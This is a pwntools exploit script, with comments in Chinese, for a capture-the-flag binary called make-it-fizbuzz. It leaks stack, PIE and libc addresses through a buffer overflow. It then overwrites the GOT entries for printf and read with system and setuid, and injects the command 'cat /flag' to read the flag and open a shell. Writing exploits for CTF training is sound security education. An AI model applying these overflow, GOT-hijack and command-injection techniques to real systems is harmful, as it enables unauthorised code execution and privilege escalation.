#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"


def exploit():
    elf = ELF("/challenge/make-it-fizbuzz")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    p = process(elf.path)

    for i in range(6):
        p.recvuntil(f"{i}: ".encode())
        if i < 5:
            p.send(b"A")

    # var_24h 在 rbp - 0x24，输入起点在 rbp - 0x3c。距离 0x18 (24 字节)
    payload_leak_stack = b"A" * 24 + b"\xff\xff\xff\xff"
    p.send(payload_leak_stack)
    p.recvuntil(b"You entered: " + payload_leak_stack)
    stack_leak = u64(p.recv(6).ljust(8, b"\x00"))

    buf_addr = stack_leak - 0x24
    log.info(f"[+] Stack Leaked! buf address: {hex(buf_addr)}")

    # 此时 var_24h 变为 0，触发 FizzBuzz
    p.recvuntil(b"0: ")
    payload_leak_pie = b"A" * 24 + b"\xff\xff\xff\xff"
    p.send(payload_leak_pie)
    p.recvuntil(b"You entered: " + payload_leak_pie)
    pie_leak = u64(p.recv(6).ljust(8, b"\x00"))

    pie_base = pie_leak - 0x4080  # address of FizzBuzz
    elf.address = pie_base
    log.info(f"[+] PIE Leaked! base address: {hex(pie_base)}")

    # 此时 var_24h 变为 0
    p.recvuntil(b"0: ")

    printf_got = elf.got["printf"]
    dest_safe = buf_addr  # rbp-0x50, 远离关键指针的局部变量区

    payload_libc = flat(
        {
            0: b"X",
            24: p32(0),  # 保持 var_24h = 0
            28: p64(printf_got),  # rbp - 0x20: src 指向 printf@GOT
            36: p64(dest_safe),  # rbp - 0x18: dest 指向栈上的安全区域
        }
    )
    p.send(payload_libc)

    p.recvuntil(b"Correct answer: ")
    libc_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    libc.address = libc_leak - libc.sym["printf"]
    log.info(f"[+] Libc Leaked! base address: {hex(libc.address)}")

    # GOT 表劫持
    p.recvuntil(b"1: ")

    system_addr = libc.sym["system"]
    printf_got = elf.got["printf"]
    src_system_ptr = buf_addr + 0x14 + 1

    payload_got1 = flat(
        {
            0: b"X" + p64(system_addr),
            24: p32(1),
            28: p64(src_system_ptr),
            36: p64(printf_got),  # 劫持 printf 的 GOT 表
        }
    )
    p.send(payload_got1)

    # 【核心修复】：不要用 recvuntil 去等 "2: " 了！
    # 因为 printf 已经变成了 system，"2: " 会被当做命令报错，永远不会正常打印。
    # 我们只需要等它报错完，进入 read() 即可。
    sleep(0.5)

    # --- 阶段五：The Arch Way - 提权与命令注入 ---
    setuid_addr = libc.sym["setuid"]
    read_got = elf.got["read"]
    src_setuid_ptr = buf_addr + 0x14 + 48

    # 构建包含恶意命令的 Payload，同时把 read 劫持为 setuid
    payload_shell = flat(
        {
            0: b"X; cat /flag #",  # 命令注入
            24: p32(2),
            28: p64(src_setuid_ptr),
            36: p64(read_got),  # 劫持 read 的 GOT 表
            48: p64(setuid_addr),  # 存放 setuid 的地址
        }
    )
    p.send(payload_shell)

    log.success("Exploit sent. Check the output below for your flag.")
    p.interactive()


if __name__ == "__main__":
    exploit()
